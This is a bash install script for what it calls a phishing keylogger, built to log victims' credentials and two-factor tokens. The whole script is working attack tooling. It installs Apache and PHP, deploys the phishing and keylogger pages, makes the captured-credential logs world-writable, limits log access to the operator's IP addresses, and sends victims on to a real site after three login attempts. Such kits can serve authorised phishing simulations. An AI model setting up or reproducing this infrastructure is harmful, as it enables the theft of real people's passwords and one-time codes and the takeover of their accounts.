#! /bin/bash

# Sets up a phishing environment to log credentials and two-factor tokens.

# Set the install directory
installDirectory="/opt/jamesm0rr1s/Phishing-Keylogger-v2"

# Update package list to pick up new repository's package information
apt update

# Install Apache
apt install -y apache2

# Install PHP
apt install -y php libapache2-mod-php

# Remove the default index file
rm /var/www/html/index*.html

# Set up files and directories for the keylogger
cp -r $installDirectory/html/* /var/www/html/

# Remove the line describing the honeypot
sed -i "s:// REMOVE THIS LINE \*\*\* Leave the two lines below as a honeypot to see if the target identifies the JavaScript and tries browsing to the non-existent page. \*\*\* REMOVE THIS LINE::g" /var/www/html/main.js

# Loop if the user does not enter anything
while true; do

	# Ask the user for the protocol
	read -p "Does the web server support HTTPS? (y/n) " choice

	# Check if the user entered yes
	if [ "$choice" == "y" ]; then

		# Set the protocol to https
		protocol="https"

		# Stop looping
		break

	# Check if the user entered no
	elif [ "$choice" == "n" ]; then

		# Set the protocol to http
		protocol="http"

		# Stop looping
		break

	fi

done

# Get the server's IP address
ip=$(hostname -I | cut -d " " -f 1)

# Update the IP address of the server
sed -i "s;https://phishing_domain;$protocol://$ip;g" /var/www/html/data/securedata/main.html

# Create pages to monitor the log files
cp /var/www/html/data/securedata/main.html /var/www/html/data/securedata/main1.html
cp /var/www/html/data/securedata/main.html /var/www/html/data/securedata/main2.html
cp /var/www/html/data/securedata/main.html /var/www/html/data/securedata/main3.html

# Remove the template file
rm /var/www/html/data/securedata/main.html

# Update pages
sed -i "s:main.txt:main1.txt:g" /var/www/html/data/securedata/main1.html
sed -i "s:main.txt:main2.txt:g" /var/www/html/data/securedata/main2.html
sed -i "s:main.txt:main3.txt:g" /var/www/html/data/securedata/main3.html

# Create log files
touch /var/www/html/data/securedata/main1.txt
touch /var/www/html/data/securedata/main2.txt
touch /var/www/html/data/securedata/main3.txt

# Allow read and write to the log file
chmod 666 /var/www/html/data/securedata/main1.txt
chmod 666 /var/www/html/data/securedata/main2.txt
chmod 666 /var/www/html/data/securedata/main3.txt

# Allow one file to be created per unique ID
chmod 757 /var/www/html/data/securedata/unique

# Enable the SSL module
a2enmod ssl

# Apply the SSL module
a2ensite default-ssl

# Turn off directory listing
a2dismod -f autoindex

# Deny all access to the securedata folder
sed -i "s:#</Directory>:#</Directory>\n\n<Directory /var/www/html/data/securedata>\n\tOrder Deny,Allow\n\tDeny from all\n#securedata\n</Directory>\n:g" /etc/apache2/apache2.conf

# Set the name of the file containing IP addresses
fileOfIps="ipAddresses.txt"

# Check if the file exists
if [ -f $installDirectory/$fileOfIps ]; then

	# Loop through each line in the file
	while read ip; do

		# Check if the line is an IP address
		if [[ $ip =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then

			# Allow access to the securedata folder for the IP address provided
			sed -i "s:#securedata:#securedata\n\tAllow from $ip:g" /etc/apache2/apache2.conf

		fi

	done < $installDirectory/$fileOfIps

# File of IP addresses does not exist
else

	# Loop if the user does not enter anything
	while true; do

		# Ask the user for an IP address
		read -p "Enter the IP address allowed to access \"data/securedata\": " ip

		# Check if the user entered a valid IP address
		if [[ $ip =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then

			# Allow access to the securedata folder for the IP address provided
			sed -i "s:#securedata:#securedata\n\tAllow from $ip:g" /etc/apache2/apache2.conf

			# Stop looping
			break

		fi

	done

fi

# Initialize the URL to redirect to
url=""

# Loop if the user does not enter anything
while [ "$url" == "" ]; do

	# Ask the user for the URL
	read -p "Enter the URL to redirect to after three login attempts: (https://www.example.com) " url

	# Check if the user did not enter anything
	if [ "$url" == "" ];  then

		# Tell the user to enter the URL
		echo "The URL is required."
	
	# The user entered an invalid IP address
	else

		# Update the URL to redirect to
		sed -i "s;https://www.example.com;$url;g" /var/www/html/main.js

	fi

done

# Restart Apache
service apache2 restart